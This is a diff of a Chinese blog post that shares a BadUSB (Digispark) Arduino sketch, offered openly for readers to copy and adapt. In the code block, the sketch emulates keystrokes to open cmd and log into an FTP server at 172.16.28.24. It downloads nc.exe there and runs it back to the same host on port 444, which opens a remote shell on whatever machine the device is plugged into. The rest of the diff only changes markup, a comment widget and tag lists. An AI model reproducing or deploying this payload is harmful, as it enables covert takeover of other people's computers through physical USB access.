@@ -8,19 +8,18 @@
   <link rel="dns-prefetch" href="https://ka1i.org">
   <title>Badusb FTP传马脚本 | 孤独常伴</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这份BADUSB FTP传马代码就是我博客未重做之前的那份，刚刚有朋友找我要索性直接发博客上的了，一下代码大家自行修改使用，会的自行Copy吧！！！
-#代码如下：">
+  <meta name="description" content="这份BADUSB FTP传马代码就是我博客未重做之前的那份，刚刚有朋友找我要索性直接发博客上的了，一下代码大家自行修改使用，会的自行Copy吧！！！ #代码如下：">
+<meta name="keywords" content="badusb">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Badusb FTP传马脚本">
 <meta property="og:url" content="https://ka1i.org/badusb/index.html">
 <meta property="og:site_name" content="孤独常伴">
-<meta property="og:description" content="这份BADUSB FTP传马代码就是我博客未重做之前的那份，刚刚有朋友找我要索性直接发博客上的了，一下代码大家自行修改使用，会的自行Copy吧！！！
-#代码如下：">
+<meta property="og:description" content="这份BADUSB FTP传马代码就是我博客未重做之前的那份，刚刚有朋友找我要索性直接发博客上的了，一下代码大家自行修改使用，会的自行Copy吧！！！ #代码如下：">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2018-01-27T11:06:04.181Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Badusb FTP传马脚本">
-<meta name="twitter:description" content="这份BADUSB FTP传马代码就是我博客未重做之前的那份，刚刚有朋友找我要索性直接发博客上的了，一下代码大家自行修改使用，会的自行Copy吧！！！
-#代码如下：">
+<meta name="twitter:description" content="这份BADUSB FTP传马代码就是我博客未重做之前的那份，刚刚有朋友找我要索性直接发博客上的了，一下代码大家自行修改使用，会的自行Copy吧！！！ #代码如下：">
   
     <link rel="alternative" href="/atom.xml" title="孤独常伴" type="application/atom+xml">
   
@@ -184,7 +183,7 @@
       
         <p><excerpt in="" index="" |="" 首页摘要=""><br>这份BADUSB FTP传马代码就是我博客未重做之前的那份，刚刚有朋友找我要<br>索性直接发博客上的了，一下代码大家自行修改使用，会的自行Copy吧！！！</excerpt></p>
 <p>#代码如下：<br><a id="more"></a></p>
-<p><the rest="" of="" contents="" |="" 余下全文=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">#include &quot;DigiKeyboard.h&quot;</div><div class="line">#define KEY_ESC     41</div><div class="line">#define KEY_BACKSPACE 42</div><div class="line">#define KEY_TAB     43</div><div class="line">#define KEY_PRT_SCR 70</div><div class="line">#define KEY_DELETE  76</div><div class="line"></div><div class="line">void setup() &#123;</div><div class="line"></div><div class="line">DigiKeyboard.delay(300);</div><div class="line">DigiKeyboard.sendKeyStroke(0);</div><div class="line">DigiKeyboard.delay(300);</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</div><div class="line">DigiKeyboard.delay(200);</div><div class="line">DigiKeyboard.print(F(&quot;cmd&quot;));</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</div><div class="line">DigiKeyboard.delay(200);</div><div class="line">DigiKeyboard.print(F(&quot;ftp&quot;));</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</div><div class="line">DigiKeyboard.delay(200);</div><div class="line">DigiKeyboard.print(F(&quot;open 172.16.28.24&quot;));</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</div><div class="line">DigiKeyboard.delay(100);</div><div class="line">DigiKeyboard.print(F(&quot;1&quot;));</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</div><div class="line">DigiKeyboard.delay(100);</div><div class="line">DigiKeyboard.print(F(&quot;1&quot;));</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</div><div class="line">DigiKeyboard.delay(100);</div><div class="line">DigiKeyboard.print(F(&quot;get nc.exe&quot;));</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</div><div class="line">DigiKeyboard.delay(100);</div><div class="line">DigiKeyboard.print(F(&quot;bye&quot;));</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</div><div class="line">DigiKeyboard.delay(200);</div><div class="line">DigiKeyboard.print(F(&quot;nc.exe&quot;));</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</div><div class="line">DigiKeyboard.delay(200);</div><div class="line">DigiKeyboard.print(F(&quot;172.16.28.24 444&quot;));</div><div class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">void loop() &#123;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></the></p>
+<p><the rest="" of="" contents="" |="" 余下全文=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;DigiKeyboard.h&quot;</span><br><span class="line">#define KEY_ESC     41</span><br><span class="line">#define KEY_BACKSPACE 42</span><br><span class="line">#define KEY_TAB     43</span><br><span class="line">#define KEY_PRT_SCR 70</span><br><span class="line">#define KEY_DELETE  76</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(300);</span><br><span class="line">DigiKeyboard.sendKeyStroke(0);</span><br><span class="line">DigiKeyboard.delay(300);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(200);</span><br><span class="line">DigiKeyboard.print(F(&quot;cmd&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(200);</span><br><span class="line">DigiKeyboard.print(F(&quot;ftp&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(200);</span><br><span class="line">DigiKeyboard.print(F(&quot;open 172.16.28.24&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(100);</span><br><span class="line">DigiKeyboard.print(F(&quot;1&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(100);</span><br><span class="line">DigiKeyboard.print(F(&quot;1&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(100);</span><br><span class="line">DigiKeyboard.print(F(&quot;get nc.exe&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(100);</span><br><span class="line">DigiKeyboard.print(F(&quot;bye&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(200);</span><br><span class="line">DigiKeyboard.print(F(&quot;nc.exe&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(200);</span><br><span class="line">DigiKeyboard.print(F(&quot;172.16.28.24 444&quot;));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></the></p>
 <blockquote>
 <p>如果文章对你有帮助,请去多多关注我博客吧! <a href="http://ka1i.org">我的博客</a></p>
 </blockquote>
@@ -374,6 +373,16 @@
   
 
   
+  <div id="SOHUCS" sid="badusb" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "cytA5lGJ9",
+        conf: "true"
+    });
+</script>
+</script>
+  
 
   
 
@@ -491,6 +500,18 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">ASPCMS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">批量</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">getshell</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">http</a>
               </li>
              
@@ -539,22 +560,6 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">ASPCMS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">批量</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">getshell</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Linux命令</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Github</a>
               </li>
              
@@ -564,6 +569,10 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Java</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">Linux命令</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -591,15 +600,15 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">WiFi攻击</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">xss</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">突破</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">WiFi攻击</a>
               </li>
              
               <li class="article-tag-list-item">
